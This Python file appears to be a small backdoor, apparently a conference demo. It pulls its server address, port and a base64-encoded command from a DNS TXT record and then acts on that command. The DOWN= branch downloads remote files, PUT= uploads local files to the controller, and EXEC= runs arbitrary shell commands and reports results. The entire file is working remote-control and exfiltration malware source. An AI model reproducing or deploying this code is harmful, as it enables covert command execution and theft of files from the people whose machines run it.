import subprocess
import base64
import requests
import dns.resolver #import the module
import time

def makeDNSrequest():
    global address
    global port
    global cmd
    results = dns.resolver.query("grrcon.thomassomerville.com","TXT").response.answer[0][-1].strings[0]
    results = results.decode("utf-8")
    results = results.split(',')
    address = results[0]
    port = results[1]
    cmd = base64.b64decode(results[2]).decode("utf-8")

def sendlog(string,logname):
    url = "http://"+address+":"+ port
    requests.put(url + "/"+ logname, data=str(string))


def executeCMD(inputCMD):
    global executionresult

    if cmd.startswith("DOWN="):
        try:
            import urllib.request
            cmd2 = cmd[5:].split(',')
            print(cmd2)
            urllib.request.urlretrieve(cmd2[0], cmd2[1])
            #sendlog("Executed the following command: " + cmd,"computername.log")
        except:
            print("hello")
            #sendlog("Failed to executed the following command: " + cmd,"computername.log")

    if cmd.startswith("PUT="):
        try:
            url = "http://"+address+":"+port
            cmd2 = cmd[4:].split(',')
            with open(cmd2[0], 'rb') as data:
                requests.put(url + "/"+ cmd2[1], data=data)

            sendlog("Executed the following command: " + cmd,"computername.log")
        except:
            sendlog("Failed to executed the following command: " + cmd,"computername.log")

    if cmd.startswith("EXEC="):
        try:
            cmd2 = cmd[5:]
            command = subprocess.Popen(cmd2, shell=True, stdout=subprocess.PIPE)
            output = command.stdout.read()
            print(str(output))
            sendlog("Executed the following command: " + cmd + "\n CMD Results: " + command,"computername.log")
        except:
            sendlog("Failed to executed the following command: " + cmd,"computername.log")

makeDNSrequest()
executeCMD(cmd)